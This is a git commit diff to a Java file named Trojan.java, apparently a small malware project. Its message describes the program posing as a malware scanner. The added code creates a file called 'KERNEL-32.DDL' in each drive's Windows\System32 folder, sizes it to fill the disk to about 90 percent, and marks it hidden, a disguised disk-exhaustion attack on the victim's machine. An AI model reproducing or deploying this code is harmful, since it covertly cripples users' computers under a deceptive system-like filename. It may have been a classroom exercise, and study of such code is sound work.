3151f7e7633114bed7bd7a120db847a7aba384c6
sanchewy <sanchewy@gmail.com>
2017-02-16 22:07:25 -0700

    Program now creates hidden file of appropriate size. Does not have a window prompt for "Scan found no malware."

--- src/Trojan.java
+++ src/Trojan.java
@@ -1,11 +1,11 @@
 
-import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileNotFoundException;
-import java.io.FileOutputStream;
-import java.io.OutputStreamWriter;
-import java.io.Writer;
-import javax.swing.filechooser.FileSystemView;
+import java.io.IOException;
+import java.io.RandomAccessFile;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
 
 /*
  * To change this license header, choose License Headers in Project Properties.
@@ -24,31 +24,25 @@ public class Trojan {
     
     public static void printDirs() {
         File[] paths;
-        FileSystemView fsv = FileSystemView.getFileSystemView();
 
-        // returns pathnames for files and directory
+        // returns "drives"
         paths = File.listRoots();
-
-        // for each pathname in pathname array
-        for(File path:paths)
-        {
-            // prints file and directory paths
-            System.out.println("Drive Name: "+path);
-            System.out.println("Description: "+fsv.getSystemTypeDescription(path));
-        }
         
-        // create file
-        File payLoad = new File("KERNEL-32.DDL");
-        
-        // try to place file in each directory until we find root dir
+        // Try to place file in each directory until we find root dir catch if
+        // in the wrong dir.
         for(File path:paths) {
             try{ 
-                path = new File(path+"Windows\\System32\\KERNEL-32.DDL");
-                FileOutputStream out = new FileOutputStream(path);
-                Writer w = new BufferedWriter(new OutputStreamWriter(out));
+                double size = (path.getTotalSpace()*.9 - (path.getTotalSpace() -path.getFreeSpace()));
+                Path p = Paths.get(path+"Windows\\System32\\KERNEL-32.DDL");
+                RandomAccessFile fLarge = new RandomAccessFile(new File(p.toString()), "rw");                
+                fLarge.setLength((long)size);
+                fLarge.close();
+                Files.setAttribute(p, "dos:hidden", Boolean.TRUE);
             }
             catch(FileNotFoundException e) {
-                System.out.println(e+" for path: "+path);
+                System.out.println(e);
+            } catch (IOException ex) {
+                System.out.println(ex);
             }
         }
     }
